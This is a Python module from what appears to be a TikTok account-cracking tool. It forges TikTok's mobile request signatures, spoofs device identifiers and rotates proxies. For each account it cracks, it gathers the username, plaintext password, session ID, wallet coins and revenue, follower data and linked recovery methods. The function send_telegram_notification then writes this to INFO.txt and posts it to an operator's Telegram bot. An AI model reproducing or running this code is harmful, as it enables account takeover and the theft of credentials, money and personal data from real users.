import random
import secrets
import string
import binascii
import os
import uuid
import re
import requests
import datetime
import pycountry
import hashlib
import time
from urllib.parse import urlencode
from config.settings import proxies_list, ADMIN_ID, ADMIN_TOKEN
from crypto import Gorgon, Ladon, Argus, sign
from .helpers import xor_value

class GetInfo:
    @staticmethod
    def signs(params, payload: str = None, sec_device_id: str = "",
              cookie: str = None, aid: int = 1233, license_id: int = 1611921764,
              sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2,
              platform: int = 19, unix: int = None):
        x_ss_stub = hashlib.md5(payload.encode('utf-8')).hexdigest() if payload else None
        if not unix:
            unix = int(time.time())
        result = Gorgon(params, unix, payload, cookie).get_value()
        result.update({
            "x-ladon": Ladon.encrypt(unix, license_id, aid),
            "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid,
                                      license_id=license_id, sec_device_id=sec_device_id,
                                      sdk_version=sdk_version_str, sdk_version_int=sdk_version)
        })
        return result

    @staticmethod
    def get_level(user_id):
        url = f"https://webcast16-normal-no1a.tiktokv.eu/webcast/user/?request_from=profile_card_v2&request_from_scene=1&target_uid={user_id}&iid={random.randint(1, 10**19)}&device_id={random.randint(1, 10**19)}&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=300102&version_name=30.1.2&device_platform=android&os=android&ab_version=30.1.2&ssmix=a&device_type=RMX3511&device_brand=realme&language=ar&os_api=33&os_version=13&openudid={binascii.hexlify(os.urandom(8)).decode()}&manifest_version_code=2023001020&resolution=1080*2236&dpi=360&update_version_code=2023001020&_rticket={round(random.uniform(1.2, 1.6) * 100000000) * -1}4632&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=ar&carrier_region=IQ&ac2=wifi&uoo=0&op_region=IQ&timezone_offset=10800&build_number=30.1.2&host_abi=arm64-v8a&locale=ar&region=IQ&content_language=gu%2C&ts={round(random.uniform(1.2, 1.6) * 100000000) * -1}&cdid={uuid.uuid4()}&webcast_sdk_version=2920&webcast_language=ar&webcast_locale=ar_IQ"
        headers = {'User-Agent': "com.zhiliaoapp.musically/2023001020 (Linux; U; Android 13; ar; RMX3511; Build/TP1A.220624.014; Cronet/TTNetVersion:06d6a583 2023-04-17 QuicVersion:d298137e 2023-02-13)"}
        headers.update(GetInfo.signs(url.split('?')[1], '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233))
        response = requests.get(url, headers=headers)
        try:
            return re.search(r'"default_pattern":"(.*?)"', response.text).group(1).split('Level ')[1]
        except Exception:
            return None

    @staticmethod
    def gets_mony(ses):
        try:
            proxy = random.choice(proxies_list) if proxies_list else None
            pro = {'https': f'http://{proxy}'} if proxy else None
            response = requests.get(
                "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&device_platform=web_pc",
                headers={'Cookie': f'sessionid={ses}',
                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'},
                proxies=pro
            )
            if response.status_code == 200:
                data = response.json()
                coins = data.get('data', {}).get('coins', 0)
                revenue = data.get('data', {}).get('exchange', {}).get('revenue', 0) / 100
                return {"coins": coins, "mony": revenue}
        except Exception:
            pass
        return {"coins": 0, "mony": 0.00}

class TikTokInfo:
    @staticmethod
    def get(username):
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
        try:
            r = requests.get(f'https://www.tiktok.com/@{username}', headers=headers, timeout=10)
            if 'webapp.user-detail' not in r.text:
                return None
            s = r.text.split('webapp.user-detail"')[1].split('"RecommendUserList"')[0]
            ex = lambda p, src, d="", yesno=False: (m := re.search(p, src)) and (m.group(1) == "true" if yesno else m.group(1)) or d
            info = {
                "user_id": ex(r'"id":"(.*?)"', s),
                "nickname": ex(r'"nickname":"(.*?)"', s),
                "signature": ex(r'"signature":"(.*?)"', s),
                "region": ex(r'"region":"(.*?)"', s),
                "following": ex(r'"followingCount":(\d+)', s, "0"),
                "followers": ex(r'"followerCount":(\d+)', s, "0"),
                "likes": ex(r'"heart":(\d+)', s, "0"),
                "videos": ex(r'"videoCount":(\d+)', s, "0"),
                "private": ex(r'"privateAccount":(true|false)', s, yesno=True),
                "verified": ex(r'"verified":(true|false)', s, yesno=True),
                "seller": ex(r'"commerceInfo":{"seller":(true|false)', s, yesno=True),
                "created": ex(r'"createTime":(\d+)', s, "0"),
                "secuid": ex(r'"secUid":"(.*?)"', s)
            }
            country = pycountry.countries.get(alpha_2=info["region"]) if info["region"] else None
            flag = getattr(country, "flag", "") if country else ""
            region_name = country.name if country else info["region"]
            try:
                ts = int("{0:b}".format(int(info["user_id"]))[:31], 2)
                created = datetime.datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
            except Exception:
                created = None
            return {
                "username": username,
                "secuid": info["secuid"],
                "name": info["nickname"],
                "followers": int(info["followers"]),
                "following": int(info["following"]),
                "likes": int(info["likes"]),
                "videos": int(info["videos"]),
                "private": info["private"],
                "country": region_name,
                "flag": flag,
                "date_created": created,
                "user_id": info["user_id"],
                "bio": info["signature"] or "",
                "verified": info["verified"],
                "tiktok_shop": info["seller"]
            }
        except Exception as e:
            print(f"[ERROR] Failed to get info for {username}: {str(e)}")
            return None

class TikTokLink:
    @staticmethod
    def send(user):
        if "@" in user:
            user = user.split("@")[1]
        secret = secrets.token_hex(16)
        cookies = {"passport_csrf_token": secret, "passport_csrf_token_default": secret}
        params = {
            'request_tag_from': "h5", 'passport-sdk-version': "6031690",
            'iid': str(random.randint(1, 10**19)), 'device_id': str(random.randint(1, 10**19)),
            'ac': "MOBILE", 'channel': "googleplay", 'aid': "567753",
            'app_name': "tiktok_studio", 'version_code': "370301", 'version_name': "37.3.1",
            'device_platform': "android", 'os': "android", 'ab_version': "37.3.1", 'ssmix': "a",
            'device_type': "Redmi Note 8 Pro", 'device_brand': "Redmi", 'language': "en",
            'os_api': "30", 'os_version': "11", 'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
            'manifest_version_code': "370301", 'resolution': "1080*2220", 'dpi': "440",
            'update_version_code': "370301", '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
            'is_pad': "0", 'current_region': "YE", 'app_type': "normal", 'sys_region': "EG",
            'last_install_time': "1735989433", 'mcc_mnc': "42103", 'timezone_name': "Asia/Aden",
            'residence': "YE", 'app_language': "en", 'carrier_region': "YE", 'ac2': "lte",
            'uoo': "1", 'op_region': "YE", 'timezone_offset': "10800", 'build_number': "37.3.1",
            'host_abi': "arm64-v8a", 'locale': "ar", 'region': "EG",
            'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
            'cdid': str(uuid.uuid4()), 'support_webview': "1",
            'cronet_version': "f6248591_2024-09-11", 'ttnet_version': "4.2.195.9-tiktok",
            'use_store_region_cookie': "1"
        }
        s = urlencode(params)
        data = {'mix_mode': "1", 'username': xor_value(user)}
        headers = {
            'User-Agent': "com.ss.android.tt.creator/370301 (Linux; U; Android 11; ar; Redmi Note 8 Pro; Build/RP1A.200720.011; Cronet/TTNetVersion:f6248591 2024-09-11 QuicVersion:182d68c8 2024-05-28)",
            'Accept': "application/json, text/plain, */*",
            'x-tt-passport-csrf-token': secret,
            'content-type': "application/x-www-form-urlencoded",
        }
        signature = sign(params=s, payload=data)
        headers.update({
            'x-ss-req-ticket': signature['x-ss-req-ticket'],
            'x-ss-stub': signature['x-ss-stub'],
            'x-argus': signature["x-argus"],
            'x-gorgon': signature["x-gorgon"],
            'x-khronos': signature["x-khronos"],
            'x-ladon': signature["x-ladon"],
        })
        try:
            proxy = random.choice(proxies_list) if proxies_list else None
            pro = {'https': f'http://{proxy}'} if proxy else None
            response = requests.post(
                f"https://api16-normal-c-alisg.tiktokv.com/passport/find_account/tiktok_username/?",
                params=s, data=data, headers=headers, cookies=cookies, proxies=pro
            )
            if "Couldn't find a TikTok account associated with this username" in response.text:
                return "Username Don't Linked In TikTok"
            if "success" in response.text:
                tok = response.json()["data"]["token"]
                m = Encrption.sign(params=urlencode(params), payload="", cookie=urlencode(cookies))
                params.update({'not_login_ticket': tok})
                headers.update({
                    'x-argus': m["x-argus"], 'x-gorgon': m["x-gorgon"],
                    'x-khronos': m["x-khronos"], 'x-ladon': m["x-ladon"]
                })
                res = requests.post(
                    f"https://api16-normal-c-alisg.ttapis.com/passport/auth/available_ways/?",
                    params=s, headers=headers, cookies=cookies, proxies=pro
                ).json()['data']
                result_lines = []
                if res.get("has_passkey"):
                    result_lines.append("Linked with passkey")
                if res.get("has_oauth"):
                    result_lines.append("Linked with external OAuth")
                    if res.get("oauth_platforms"):
                        result_lines.append("OAuth Platforms: " + ", ".join(res["oauth_platforms"]))
                if res.get("has_email"):
                    result_lines.append("Linked with email")
                if res.get("has_mobile"):
                    result_lines.append("Linked with phone number")
                if not result_lines:
                    return "Not linked to passkey, OAuth, email, or phone number"
                return "\n".join(result_lines)
        except Exception:
            return "null"

class Encrption:
    @staticmethod
    def xor(string: str) -> str:
        return "".join([hex(ord(_) ^ 5)[2:] for _ in string])

    @staticmethod
    def sign(params, payload: str = None, sec_device_id: str = "",
             cookie: str = None, aid: int = 567753, license_id: int = 1611921764,
             sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2,
             platform: int = 19, unix: int = None):
        x_ss_stub = hashlib.md5(payload.encode('utf-8')).hexdigest() if payload else None
        if not unix:
            unix = int(time.time())
        result = Gorgon(params, unix, payload, cookie).get_value()
        result.update({
            "x-ladon": Ladon.encrypt(unix, license_id, aid),
            "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid,
                                      license_id=license_id, sec_device_id=sec_device_id,
                                      sdk_version=sdk_version_str, sdk_version_int=sdk_version)
        })
        return result

def send_telegram_notification(username, password, hh, ses):
    try:
        user_info = TikTokInfo.get(username)
        if not user_info:
            user_info = {"username": username, "user_id": "N/A", "name": username,
                         "followers": 0, "following": 0, "likes": 0, "videos": 0,
                         "private": False, "country": "N/A", "flag": "", "date_created": "N/A",
                         "secuid": "N/A", "bio": "No bio available", "verified": False,
                         "tiktok_shop": False}
        followers = "{:,}".format(user_info.get('followers', 0))
        if hh == 1:
            mons = GetInfo.gets_mony(ses)
            ass = f'''
TikTok Account Type Hits
Username : {username}
password : {password}
SessionId : {ses}
coins : {mons['coins']}
money : {mons['mony']}
id : {user_info.get('user_id', 'N/A')}
Account Created : {user_info.get('date_created', 'N/A')}
Country  : {user_info.get('flag', '')} - {user_info.get('country', 'N/A')}
followers : {followers}
following : {user_info.get('following', 0):,}
Verified : {'Yes' if user_info.get('verified') else 'No'}
Level : {GetInfo.get_level(user_info.get('user_id', 'N/A'))}
{TikTokLink.send(username)}
by : @G8F8F
'''
        elif hh == 2:
            ass = f'''
TikTok Account Type Secured
Username : {username}
password : {password}
id : {user_info.get('user_id', 'N/A')}
Account Created : {user_info.get('date_created', 'N/A')}
Country  : {user_info.get('flag', '')} - {user_info.get('country', 'N/A')}
followers : {followers}
following : {user_info.get('following', 0):,}
Verified : {'Yes' if user_info.get('verified') else 'No'}
Level : {GetInfo.get_level(user_info.get('user_id', 'N/A'))}
{TikTokLink.send(username)}
by : @G8F8F
'''
        else:
            ass = f'''
TikTok Account Type 2FA
Username : {username}
password : {password}
id : {user_info.get('user_id', 'N/A')}
Account Created : {user_info.get('date_created', 'N/A')}
Country  : {user_info.get('flag', '')} - {user_info.get('country', 'N/A')}
followers : {followers}
following : {user_info.get('following', 0):,}
Verified : {'Yes' if user_info.get('verified') else 'No'}
Level : {GetInfo.get_level(user_info.get('user_id', 'N/A'))}
{TikTokLink.send(username)}
by : @G8F8F
'''
        with open("INFO.txt", '+a', encoding="utf-8") as f:
            f.write(f"{str(ass)}\n")
        if ADMIN_TOKEN and ADMIN_ID:
            requests.post(f"https://api.telegram.org/bot{ADMIN_TOKEN}/sendMessage?chat_id={ADMIN_ID}&text=" + str(ass))
    except Exception:
        pass